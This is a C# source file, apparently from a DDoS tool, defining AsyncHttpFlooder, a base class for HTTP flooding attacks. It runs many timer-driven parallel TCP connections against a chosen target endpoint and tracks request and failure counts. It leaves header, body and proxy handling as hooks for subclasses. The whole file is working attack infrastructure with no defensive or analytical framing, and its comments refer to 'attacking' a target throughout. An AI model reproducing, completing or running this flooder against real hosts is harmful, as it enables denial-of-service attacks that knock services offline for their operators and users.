using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using Timer = System.Timers.Timer;

namespace GAS.Core.Attacks {
    /// <summary>
    /// Base class for http flooders
    /// </summary>
    public class AsyncHttpFlooder {
        #region Vars
        private bool _active;
        private double _interval;
        private ElapsedEventHandler[] _handlers;
        private int _maxTasks = 64;
        private int _taskCount = 0;
        private int _threads = 1;
        private IPEndPoint _target;
        #region Synchroniztion
        private Timer _syncTimer;
        private readonly ManualResetEvent ExitEvent = new ManualResetEvent( true );
        /// <summary>
        /// Stopwatch for delays/similar
        /// </summary>
        protected readonly Stopwatch SyncWatch;
        private readonly object _consoleLocker = 0;
        /// <summary>
        /// Lock object for TaskCount
        /// </summary>
        protected readonly object TaskCountLocker = 0;
        /// <summary>
        /// Lock object for Requested
        /// </summary>
        protected readonly object RequestedLocker = 0;
        /// <summary>
        /// Lock object for Failed
        /// </summary>
        protected readonly object FailedLocker = 0;
        #endregion
        #endregion
        #region Settings & stats
        /// <summary>
        /// Is attack running
        /// </summary>
        public bool Active {
            get { return this._active; }
        }
        /// <summary>
        /// Target IPEndPoint
        /// </summary>
        public IPEndPoint Target {
            get { return this._target; }
            set {
                if ( this._active )
                    throw new InvalidOperationException( "Target changing is not allowed while attacking" );
                this._target = value;
            }
        }
        /// <summary>
        /// Number of running tasks
        /// </summary>
        public int TaskCount {
            get {
                return this._taskCount;
            }
            protected set {
                this._taskCount = value;
                if ( value < 0 )
                    throw new ArgumentOutOfRangeException( "value", this._taskCount, "TaskCount < 0" );
                if ( value == 0 )
                    this.ExitEvent.Set();
            }
        }
        /// <summary>
        /// Number of || invoked connection requests
        /// </summary>
        public int Threads {
            get {
                return this._threads;
            }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Thread setting not allowed while attacking" );
                if ( value < 1 )
                    throw new ArgumentOutOfRangeException( "Threads must be > 0" );
                this._threads = value;
            }
        }
        /// <summary>
        /// Requested counter
        /// </summary>
        public int Requested { get; set; }
        /// <summary>
        /// Failed counter
        /// </summary>
        public int Failed { get; set; }
        /// <summary>
        /// Limit of parallel connections
        /// </summary>
        public int MaxTasks {
            get { return this._maxTasks; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Task limit setting is not allowed while attacking" );
                if ( value < 1 )
                    throw new ArgumentOutOfRangeException( "MaxTasks must be > 0" );
                this._maxTasks = value;
            }
        }
        /// <summary>
        /// Timer interval in ms. Values &lt; 15 don't work.
        /// </summary>
        public double Interval {
            get { return _interval; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "Interval setting is not allowed while attacking" );
                if ( value <= 0 )
                    throw new ArgumentOutOfRangeException( "Interval must be > 0" );
                if ( this._interval == value ) return;
                this._interval = value;
                this._syncTimer.Interval = value;
            }
        }
        #endregion
        #region Constructor
        /// <summary>
        /// Constructor
        /// </summary>
        public AsyncHttpFlooder() {
            _syncTimer = new Timer();
            this.SyncWatch = new Stopwatch();
        }
        #endregion
        #region Controls
        /// <summary>
        /// Starts execution
        /// </summary>
        public virtual void Start() {
            lock ( this ) {
                if ( this._active ) throw new InvalidOperationException( "Attack already running" );
                this._active = true;
            }
            _syncTimer.Start();
            _handlers = new ElapsedEventHandler[ this.Threads ];
            for ( var i = 0; i < this.Threads; i++ ) {
                _handlers[ i ] = this.AttackCore;
                this._syncTimer.Elapsed += _handlers[ i ];
            }
            this.SyncWatch.Restart();
        }
        /// <summary>
        /// Stops execution
        /// </summary>
        public virtual void Stop() {
            lock ( this ) {
                if ( !this.Active ) throw new InvalidOperationException( "Attack not running" );
                this._active = false;
            }
            _syncTimer.Stop();
            bool running;
            lock ( this.TaskCountLocker ) running = this._taskCount > 0;
            if ( !running ) return;
            this.ExitEvent.Reset();
            this.ExitEvent.WaitOne();
            for ( var i = 0; i < this.Threads; i++ )
                this._syncTimer.Elapsed -= _handlers[ i ];
        }
        #endregion
        #region Heart
        /// <summary>
        /// Heart
        /// </summary>
        private async void AttackCore( object sender, ElapsedEventArgs e ) {
            if ( this.TaskCount >= this.MaxTasks ) return;
            IncrementTaskCount();
            lock ( this.RequestedLocker )
                ++this.Requested;
            try {
                object token;
                using ( var t = this.GetTcpClient( out token ) ) {
                    await t.ConnectAsync( this.Target.Address, this.Target.Port );
                    if ( !t.Connected ) return;
                    using ( var stream = this.ProcessStream( t.GetStream(), token ) ) {
                        if ( !await this.SendHeaders( stream, token ) ) return;
                        if ( !this.Active && t.Connected ) return;
                        if ( !await this.SendBody( stream, token ) ) return;
                        if ( !this.Active && t.Connected ) return;
                        if ( !await this.ReceiveResponse( stream, token ) ) return;
                        if ( !this.Active && t.Connected ) return;
                    }
                }
            }
            catch {
                lock ( this.FailedLocker )
                    ++this.Failed;
                this.dw( "Handling exception" );
            }
            finally {
                DecrementTaskCount();
            }
        }
        /// <summary>
        /// Wrapper for debugging purposes
        /// </summary>
        private void DecrementTaskCount() {
            this.dw( this.TaskCount.ToString() );
            lock ( this.TaskCountLocker )
                --this.TaskCount;
        }
        /// <summary>
        /// Wrapper for debugging purposes
        /// </summary>
        private void IncrementTaskCount() {
            this.dw( this.TaskCount.ToString() );
            lock ( this.TaskCountLocker )
                ++this.TaskCount;
        }
        #endregion
        #region Core
        /// <summary>
        /// Gets client for connecting.
        /// Override to use proxies/similar stuff
        /// </summary>
        /// <param name="token">token to use in async funcs</param>
        /// <returns></returns>
        protected virtual TcpClient GetTcpClient( out object token ) {
            this.dw( "Made new TcpClient" );
            token = null;
            return new TcpClient();
        }
        /// <summary>
        /// Receives response
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected virtual async Task<bool> ReceiveResponse( NetworkStream stream, object token ) {
            this.dw( "Receiving body" );
            return true;
        }
        /// <summary>
        /// Sends body.
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected virtual async Task<bool> SendBody( NetworkStream stream, object token ) {
            this.dw( "Sending body" );
            return true;
        }
        /// <summary>
        /// Sends headers.
        /// Override to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected virtual async Task<bool> SendHeaders( NetworkStream stream, object token ) {
            this.dw( "Sending headers" );
            return true;
        }
        /// <summary>
        /// Prepares stream for transfer.
        /// Gets stream from raw stream after connection
        /// Override to use ssl/similar.
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        protected virtual NetworkStream ProcessStream( NetworkStream getStream, object token ) {
            this.dw( "Wrapping stream" );
            return getStream;
        }
        /// <summary>
        /// Just for debugging
        /// </summary>
        /// <param name="s"></param>
        private void dw( string s ) {
        }
        #endregion
    }
}
